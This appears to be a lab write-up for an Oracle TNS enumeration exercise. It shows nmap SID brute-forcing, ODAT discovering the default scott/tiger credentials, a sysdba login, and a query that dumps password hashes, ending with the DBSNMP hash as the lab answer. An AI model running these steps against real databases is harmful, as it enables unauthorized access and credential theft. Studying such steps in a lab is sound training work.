# Oracle TNS

### Enumerate the target Oracle database and submit the password hash of the user DBSNMP as the answer.

```bash
┌──(kali㉿kali)-[~]
└─$ sudo nmap -p1521 -sV 10.129.205.19 --open --script oracle-sid-brute 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-15 03:57 EST
Nmap scan report for 10.129.205.19 (10.129.205.19)
Host is up (0.28s latency).

PORT     STATE SERVICE    VERSION
1521/tcp open  oracle-tns Oracle TNS listener 11.2.0.2.0 (unauthorized)
| oracle-sid-brute: 
|_  XE
```

We can also use ODAT, usage example below: (this takes a long time to run, so be patient :/)

<pre class="language-bash"><code class="lang-bash"><strong>sudo odat all -s 10.129.205.19
</strong>sudo odat all -s 10.129.205.19 -d XE #for faster scan since we already know the sid
[+] Accounts found on 10.129.243.14:1521/sid:XE:  | Time: 00:28:32 
scott/tiger
</code></pre>

now to login into oracledb

```
sqlplus scott/tiger@10.129.243.14/XE
select * from user_role_privs;
```

Here, the user `scott` has no administrative privileges. However, we can try using this account to log in as the System Database Admin (`sysdba`), giving us higher privileges. This is possible when the user `scott` has the appropriate privileges typically granted by the database administrator or used by the administrator him/herself.

```
sqlplus scott/tiger@10.129.204.235/XE as sysdba
```

```sql
select * from user_role_privs;
select name, password from sys.user$;
NAME                           PASSWORD
------------------------------ ------------------------------
DBSNMP                         E066D214D5421CCC
```
